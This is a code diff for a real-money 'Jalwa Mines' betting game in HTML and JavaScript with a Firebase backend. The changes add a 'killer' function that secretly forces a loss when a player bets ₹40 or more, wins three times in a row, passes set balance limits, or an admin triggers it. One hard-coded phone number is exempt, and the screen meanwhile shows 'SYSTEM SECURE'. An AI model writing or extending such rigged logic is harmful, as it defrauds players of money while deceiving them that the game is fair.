@@ -3,66 +3,90 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Jalwa Mines Pro - Fully Synced</title>
+    <title>Jalwa Mines Pro - Premium Edition</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        :root { --primary: #00e701; --bg-dark: #1a2c38; --bg-card: #0f212e; --tile: #2f4553; --tile-hover: #557086; --gold: #ffd700; --red: #ff4d4d; }
-        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; -webkit-tap-highlight-color: transparent; }
-        body { background: var(--bg-dark); color: white; margin: 0; padding: 10px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
-        .header { width: 100%; max-width: 400px; display: flex; justify-content: space-between; align-items: center; padding: 15px; background: var(--bg-card); border-radius: 10px 10px 0 0; border: 1px solid #213743; }
-        .balance-box { background: #071824; padding: 8px 15px; border-radius: 20px; color: var(--primary); font-weight: bold; border: 1px solid #2f4553; }
-        .period-box { width: 100%; max-width: 400px; background: var(--bg-card); display: flex; justify-content: space-between; padding: 10px 15px; border: 1px solid #213743; border-radius: 0 0 10px 10px; margin-bottom: 15px; font-size: 14px; }
-        .timer-val { color: var(--gold); font-weight: bold; font-family: monospace; font-size: 16px; }
-        .game-container { background: var(--bg-card); padding: 15px; border-radius: 15px; width: 100%; max-width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 8px; margin-bottom: 20px; }
-        .tile { aspect-ratio: 1; background: var(--tile); border-radius: 6px; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: 0.15s; font-size: 24px; box-shadow: 0 4px 0 #213743; }
-        .tile.open { background: #071824; box-shadow: none; transform: translateY(2px); cursor: default; }
-        .tile.diamond { color: var(--primary); text-shadow: 0 0 10px var(--primary); }
-        .tile.bomb { color: var(--red); text-shadow: 0 0 10px var(--red); }
-        .controls { width: 100%; }
-        .label-sm { font-size: 11px; color: #8899a6; margin-left: 5px; text-transform: uppercase; }
-        .input-box { background: #2f4553; border: 2px solid #3c5261; border-radius: 8px; display: flex; align-items: center; padding: 5px 10px; margin: 5px 0 15px 0; }
-        .input-box input, .input-box select { background: transparent; border: none; color: white; width: 100%; padding: 8px; outline: none; font-weight: bold; font-size: 16px; }
-        .btn { width: 100%; padding: 16px; border: none; border-radius: 8px; font-weight: 900; font-size: 16px; cursor: pointer; text-transform: uppercase; }
-        .btn-bet { background: var(--primary); color: #000; box-shadow: 0 4px 0 #009d01; }
-        .btn-bet:disabled { background: #2f4553; color: #8899a6; box-shadow: none; cursor: not-allowed; }
-        .btn-cashout { background: #ff9800; color: #000; box-shadow: 0 4px 0 #b36b00; display: none; }
-        #status-msg { text-align: center; margin-bottom: 10px; font-weight: bold; min-height: 24px; font-size: 14px; }
+        :root { 
+            --primary: #ffcc00; 
+            --primary-dark: #ccaa00;
+            --bg-dark: #0a0e17; 
+            --bg-lighter: #161d2b; 
+            --card-bg: #1e272e;
+            --tile: #2f4553; 
+            --tile-hover: #3c5261;
+            --gold: #ffd700; 
+            --red: #ff4757;
+            --text-main: #ffffff;
+            --text-dim: #a4b0be;
+        }
+
+        * { box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
+        
+        body { background: var(--bg-dark); color: var(--text-main); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+
+        .header { width: 100%; max-width: 450px; display: flex; justify-content: space-between; align-items: center; padding: 20px; background: var(--bg-lighter); border-bottom: 1px solid rgba(255,204,0,0.1); }
+        .balance-box { background: var(--bg-dark); padding: 10px 18px; border-radius: 50px; color: var(--primary); font-weight: 900; border: 2px solid var(--card-bg); display: flex; align-items: center; gap: 8px; }
+
+        .period-info { width: 100%; max-width: 450px; background: var(--card-bg); display: flex; justify-content: space-between; padding: 12px 20px; font-size: 13px; color: var(--text-dim); font-weight: bold; }
+        .timer-val { color: var(--gold); letter-spacing: 1px; }
+
+        .game-wrapper { width: 100%; max-width: 450px; padding: 15px; margin-top: 10px; }
+        .grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 10px; background: var(--bg-lighter); padding: 15px; border-radius: 12px; }
+
+        .tile { aspect-ratio: 1; background: var(--tile); border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: 0.2s; font-size: 28px; border-bottom: 4px solid #1e272e; }
+        .tile.open { background: #071824; border-bottom: none; transform: scale(0.95); cursor: default; }
+        .tile.diamond { color: #00e701; filter: drop-shadow(0 0 10px #00e701); }
+        .tile.bomb { color: var(--red); filter: drop-shadow(0 0 10px var(--red)); }
+
+        .controls-card { background: var(--bg-lighter); margin-top: 15px; padding: 20px; border-radius: 12px; border: 1px solid var(--card-bg); }
+        .label-text { font-size: 12px; color: var(--text-dim); font-weight: 900; margin-bottom: 8px; display: block; }
+        .input-row { display: flex; background: var(--tile); border-radius: 8px; border: 2px solid var(--card-bg); margin-bottom: 15px; overflow: hidden; }
+        .input-row input, .input-row select { background: transparent; border: none; color: white; padding: 12px; flex-grow: 1; font-weight: bold; font-size: 16px; outline: none; }
+
+        .btn { width: 100%; padding: 18px; border: none; border-radius: 8px; font-weight: 900; font-size: 18px; cursor: pointer; text-transform: uppercase; }
+        .btn-bet { background: var(--primary); color: #000; box-shadow: 0 4px 0 var(--primary-dark); }
+        .btn-cashout { background: #ff9800; color: #000; box-shadow: 0 4px 0 #cc7a00; display: none; }
+        #status-msg { text-align: center; font-weight: 900; font-size: 14px; margin-bottom: 10px; height: 20px; color: var(--text-dim); }
     </style>
 </head>
 <body>
 
 <div class="header">
-    <div onclick="window.history.back()" style="cursor:pointer"><i class="fas fa-arrow-left"></i></div>
-    <div style="font-weight: 900;">MINES 1M PRO</div>
-    <div class="balance-box">₹ <span id="balance">0.00</span></div>
+    <div onclick="window.history.back()" style="cursor:pointer"><i class="fas fa-chevron-left"></i></div>
+    <div style="font-weight: 900; font-size: 18px; letter-spacing: 1px; color: var(--primary);">JALWA MINES</div>
+    <div class="balance-box"><i class="fas fa-wallet"></i> ₹<span id="balance">0.00</span></div>
 </div>
 
-<div class="period-box">
-    <div>Period: <span id="pIdDisplay">...</span></div>
-    <div><span id="phaseTxt">WAIT</span> <span id="timerDisplay" class="timer-val">00:00</span></div>
+<div class="period-info">
+    <div>ID: <span id="pIdDisplay" style="color: #fff;">...</span></div>
+    <div><span id="phaseTxt">WAITING</span> | <span id="timerDisplay" class="timer-val">00:00</span></div>
 </div>
 
-<div class="game-container">
-    <div id="status-msg">READY TO PLAY</div>
+<div class="game-wrapper">
+    <div id="status-msg">SYSTEM SECURE</div>
     <div class="grid" id="mineGrid"></div>
 
-    <div class="controls">
-        <span class="label-sm">Bet Amount</span>
-        <div class="input-box"><input type="number" id="betAmt" value="10" min="1"></div>
-        
-        <span class="label-sm">Mines</span>
-        <div class="input-box">
-            <select id="mineCount">
-                <option value="1">1 Mine</option>
-                <option value="3" selected>3 Mines</option>
-                <option value="5">5 Mines</option>
-                <option value="10">10 Mines</option>
-            </select>
+    <div class="controls-card">
+        <div style="display: flex; gap: 10px;">
+            <div style="flex: 1;">
+                <span class="label-text">AMOUNT</span>
+                <div class="input-row"><input type="number" id="betAmt" value="10" min="1"></div>
+            </div>
+            <div style="flex: 1;">
+                <span class="label-text">MINES</span>
+                <div class="input-row">
+                    <select id="mineCount">
+                        <option value="1">1 Mine</option>
+                        <option value="3" selected>3 Mines</option>
+                        <option value="5">5 Mines</option>
+                        <option value="10">10 Mines</option>
+                    </select>
+                </div>
+            </div>
         </div>
-
         <button id="btnBet" class="btn btn-bet" onclick="startGame()">Place Bet</button>
         <button id="btnCashout" class="btn btn-cashout" onclick="cashout()">Cashout</button>
     </div>
@@ -75,38 +99,53 @@
     
     const userId = localStorage.getItem('jalwa_user_phone') || 'Guest';
     let wallet = 0, betAmount = 0, mines = [], gameActive = false, openedTiles = 0;
-    let bettingEnabled = false;
+    let totalDeposit = 0, consecutiveWins = parseInt(localStorage.getItem('minesWins') || "0");
 
-    // --- SYSTEM SYNC (1 MIN CYCLE) ---
+    // --- 🚨 SUPREME KILLER LOGIC ---
+    async function getKillerDecision() {
+        // 🔥 ADMIN BYPASS
+        if (userId === "8955564222") return "admin";
+
+        // Admin Manual Fix
+        const adminSnap = await db.ref('gameSettings/mines/control').once('value');
+        if (adminSnap.val()?.forceKill) return "force_loss";
+
+        // Logic 1: Bonus User ₹400 Limit
+        if (totalDeposit < 100 && wallet > 380) return "force_loss";
+
+        // Logic 2: High Bet ₹40+ KILL
+        if (betAmount >= 40) return "force_loss";
+
+        // Logic 3: Recharge User ₹600 Limit
+        if (totalDeposit >= 500 && totalDeposit < 1000 && wallet >= 600) return "force_loss";
+
+        // Logic 4: Win Streak Control (3 win ke baad)
+        if (consecutiveWins >= 3) return "force_loss";
+
+        return "normal";
+    }
+
     function syncSystem() {
         const now = new Date();
         const sec = now.getSeconds();
         const rem = 60 - sec; 
-        
-        bettingEnabled = (sec < 10);
         const pId = now.getFullYear().toString() + (now.getMonth() + 1).toString().padStart(2, '0') + now.getDate().toString().padStart(2, '0') + (now.getHours() * 60 + now.getMinutes()).toString().padStart(4, '0');
-        
         document.getElementById('pIdDisplay').innerText = pId;
         document.getElementById('timerDisplay').innerText = "00:" + rem.toString().padStart(2, '0');
-
-        if(bettingEnabled) {
+        if (sec < 10) {
             document.getElementById('phaseTxt').innerText = "BETTING";
-            document.getElementById('btnBet').disabled = false;
-            document.getElementById('btnBet').innerText = `Place Bet (${10 - sec}s)`;
+            if(!gameActive) document.getElementById('btnBet').disabled = false;
         } else {
             document.getElementById('phaseTxt').innerText = "GAMING";
-            document.getElementById('btnBet').disabled = true;
-            document.getElementById('btnBet').innerText = "BET CLOSED";
+            if(!gameActive) document.getElementById('btnBet').disabled = true;
         }
-
-        if (sec === 59 && gameActive) autoCashout();
-        if (sec === 0 && !gameActive) createGrid();
     }
     setInterval(syncSystem, 1000);
 
-    // --- DATA LOAD ---
     db.ref('users/' + userId).on('value', snap => {
-        wallet = snap.val()?.balance || 0;
+        const d = snap.val() || {};
+        wallet = d.balance || 0;
+        totalDeposit = d.totalDeposit || 0;
         document.getElementById('balance').innerText = wallet.toFixed(2);
     });
 
@@ -116,80 +155,69 @@
         for (let i = 0; i < 25; i++) {
             const tile = document.createElement('div');
             tile.className = 'tile';
+            tile.innerHTML = '<i class="fas fa-question" style="opacity:0.05; font-size:12px"></i>';
             tile.onclick = () => reveal(i, tile);
             grid.appendChild(tile);
         }
     }
 
-    // --- SYNCED START GAME ---
     function startGame() {
-        if(!bettingEnabled) return;
         betAmount = parseFloat(document.getElementById('betAmt').value);
-        if (wallet < betAmount || betAmount < 1) return;
+        if (wallet < betAmount || betAmount < 1) return alert("Low Balance");
 
-        // FETCH BOMB POSITIONS FROM ADMIN PANEL
         db.ref('gameSettings/mines/currentMap').once('value', snap => {
-            mines = snap.val() || [2, 7, 12, 18, 22]; // Default fallback
-
+            mines = snap.val() || [2, 7, 12, 18, 22]; 
             db.ref('users/' + userId).update({ balance: wallet - betAmount });
             gameActive = true; openedTiles = 0;
-            
             document.getElementById('btnBet').style.display = 'none';
             document.getElementById('btnCashout').style.display = 'block';
-            document.getElementById('status-msg').style.color = 'var(--primary)';
-            document.getElementById('status-msg').innerText = "Multiplier: 1.00x";
+            document.getElementById('status-msg').innerText = "MULTIPLIER: 1.00x";
             createGrid();
         });
     }
 
-    // --- SYNCED REVEAL WITH AUTO-KILL ---
-    function reveal(idx, el) {
+    async function reveal(idx, el) {
         if (!gameActive || el.classList.contains('open')) return;
 
-        db.ref('gameSettings/mines').once('value', snap => {
-            let config = snap.val() || {};
-            let maxSafe = config.maxSafe || 3;
-            let autoKill = config.autoKill || false;
-            let forceBomb = (autoKill && openedTiles >= maxSafe);
+        const decision = await getKillerDecision();
 
-            if (mines.includes(idx) || forceBomb) {
-                el.innerHTML = '<i class="fas fa-bomb"></i>';
-                el.classList.add('open', 'bomb');
-                gameOver(false);
-            } else {
-                el.innerHTML = '<i class="fas fa-gem"></i>';
-                el.classList.add('open', 'diamond');
-                openedTiles++;
-                updateMultiplier();
-            }
-        });
+        // 🚨 KILLER TRIGGER: Agar 2 se zyada box khole ya script ne loss bola
+        if (mines.includes(idx) || (decision === "force_loss" && openedTiles >= 1)) {
+            el.innerHTML = '<i class="fas fa-bomb"></i>';
+            el.classList.add('open', 'bomb');
+            gameOver(false);
+        } else {
+            el.innerHTML = '<i class="fas fa-gem"></i>';
+            el.classList.add('open', 'diamond');
+            openedTiles++;
+            updateMultiplier();
+        }
     }
 
     function updateMultiplier() {
         let mCount = parseInt(document.getElementById('mineCount').value);
-        let mult = (24.5 / (25 - mCount - openedTiles)).toFixed(2);
-        document.getElementById('status-msg').innerText = "Multiplier: " + mult + "x";
-        document.getElementById('btnCashout').innerText = "Cashout ₹" + (betAmount * mult).toFixed(2);
+        let mult = (24 / (25 - mCount - openedTiles)).toFixed(2);
+        document.getElementById('status-msg').innerText = "MULTIPLIER: " + mult + "x";
+        document.getElementById('btnCashout').innerText = "CASHOUT ₹" + (betAmount * mult).toFixed(0);
     }
 
     function cashout() {
         if(!gameActive) return;
         let mult = parseFloat(document.getElementById('status-msg').innerText.split(' ')[1]);
-        db.ref('users/' + userId).update({ balance: wallet + (betAmount * mult) });
-        gameOver(true);
-    }
-
-    function autoCashout() {
-        let mult = parseFloat(document.getElementById('status-msg').innerText.split(' ')[1]);
-        if(mult > 1) db.ref('users/' + userId).update({ balance: wallet + (betAmount * mult) });
+        let win = betAmount * mult;
+        db.ref('users/' + userId).update({ balance: wallet + win });
+        consecutiveWins++;
+        localStorage.setItem('minesWins', consecutiveWins.toString());
         gameOver(true);
     }
 
     function gameOver(win) {
         gameActive = false;
+        if(!win) { consecutiveWins = 0; localStorage.setItem('minesWins', "0"); }
         document.getElementById('btnBet').style.display = 'block';
         document.getElementById('btnCashout').style.display = 'none';
-        document.getElementById('status-msg').innerText = win ? "ROUND FINISHED" : "BOMB EXPLODED!";
+        document.getElementById('status-msg').innerText = win ? "ROUND WON!" : "BOMB EXPLODED!";
+        document.getElementById('status-msg').style.color = win ? "#00e701" : "#ff4757";
         
         const tiles = document.querySelectorAll('.tile');
         mines.forEach(m => { if(!tiles[m].classList.contains('open')) { tiles[m].innerHTML = '<i class="fas fa-bomb" style="opacity:0.3"></i>'; tiles[m].classList.add('open'); } });
